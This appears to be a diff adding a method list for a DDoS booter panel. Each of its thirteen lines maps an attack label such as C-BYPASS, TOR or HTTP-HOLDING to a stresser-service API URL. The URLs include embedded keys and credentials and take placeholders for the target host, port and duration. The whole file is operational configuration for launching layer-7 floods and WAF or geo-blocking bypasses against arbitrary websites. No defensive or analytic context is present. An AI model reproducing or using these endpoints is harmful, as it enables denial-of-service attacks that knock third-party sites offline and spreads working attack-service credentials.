@@ -1,0 +1,13 @@
+[VIP] HTTP-IOS|https://l7srv.ru/attack?token=o1WLpyAREYgQN0e3ASj9Ic&host=<target>&port=443&time=<duration>&method=browser&concs=10|1
+[VIP] C-EXPLOIT|http://185.14.92.111:8080/api/attack?username=ruby&key=1234&host=<target>&port=443&time=<duration>&method=tls-vip|1
+[VIP] C-ROSES|http://185.14.92.111:8080/api/attack?username=ruby&key=1234&host=<target>&port=443&time=<duration>&method=oper_l7|1
+[VIP] C-RUSH|http://185.14.92.111:8080/api/attack?username=ruby&key=1234&host=<target>&port=443&time=<duration>&method=browser|1
+[VIP] C-BYPASS|http://185.14.92.111:8080/api/attack?username=ruby&key=1234&host=<target>&port=443&time=<duration>&method=tls-vip|1
+[TOR] TOR|https://api.stresscat.su/start?api_key=T7fCyYWC9p&user=5974&target=<target>&time=<duration>&method=HTTP-TOR|1
+[VIP] C-H2|http://185.14.92.111:8080/api/attack?username=ruby&key=1234&host=<target>&port=443&time=<duration>&method=https-vip|1
+[VIP] C-H1|http://185.14.92.111:8080/api/attack?username=ruby&key=1234&host=<target>&port=443&time=<duration>&method=https-vip|1
+[VIP] DIVINE|http://185.14.92.111:8080/api/attack?username=ruby&key=1234&host=<target>&port=443&time=<duration>&method=https-vip|1
+[VIP] GEO-BYPASS|http://185.14.92.111:8080/api/attack?username=ruby&key=1234&host=<target>&port=443&time=<duration>&method=https-vip|1
+RAW-H2|http://185.14.92.111:8080/api/attack?username=ruby&key=1234&host=<target>&port=443&time=<duration>&method=https-vip|1
+RAW-H1|http://185.14.92.111:8080/api/attack?username=ruby&key=1234&host=<target>&port=443&time=<duration>&method=https-vip|1
+[HOLD] HTTP-HOLDING|https://api.pyreflood.su/start?key=l4MqPqI&host=<target>&time=<duration>&method=WAF-BYPASS&port=443|1
